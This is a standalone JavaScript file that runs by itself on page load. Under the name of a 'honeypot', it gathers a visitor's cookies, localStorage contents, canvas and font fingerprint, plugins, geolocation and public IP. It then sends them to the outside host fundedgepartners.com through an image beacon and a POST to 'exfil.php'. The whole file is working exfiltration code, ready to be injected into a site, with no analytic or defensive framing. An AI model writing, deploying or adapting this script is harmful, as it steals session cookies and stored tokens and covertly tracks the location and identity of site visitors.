const host = 'https://fundedgepartners.com/js/';
async function deployHoneypot() {
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.fillText(' honeypot ', 0, 0);
  const canvasFingerprint = canvas.toDataURL();

  const basicInfo = {
    url: window.location.href,
    title: document.title,
    referrer: document.referrer,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    online: navigator.onLine,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    canvas: canvasFingerprint,
    plugins: Array.from(navigator.plugins || []).map(p => p.name),
    fonts: tryFonts(),
    geolocation: await getGeolocation(),
    ip: await getPublicIP()
  };

  function tryFonts() {
    const fonts = [];
    if (document.fonts) {
      document.fonts.forEach(font => fonts.push(font.family));
    }
    return fonts;
  }

  async function getGeolocation() {
    return new Promise(resolve => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        }),
        () => resolve(null),
        { timeout: 5000 }
      );
    });
  }

  async function getPublicIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch (e) {
      return null;
    }
  }

  const img = new Image();
  img.src = host + "/exfil?" +
            "data=" + encodeURIComponent(btoa(JSON.stringify(basicInfo)));
  document.body.appendChild(img);

  fetch(host + '/exfil.php', {
    method: 'POST',
    body: JSON.stringify(basicInfo),
    headers: { 'Content-Type': 'application/json' },
    mode: 'no-cors'
  }).catch(e => console.error('Exfil failed:', e));
}
deployHoneypot().catch(console.error);   
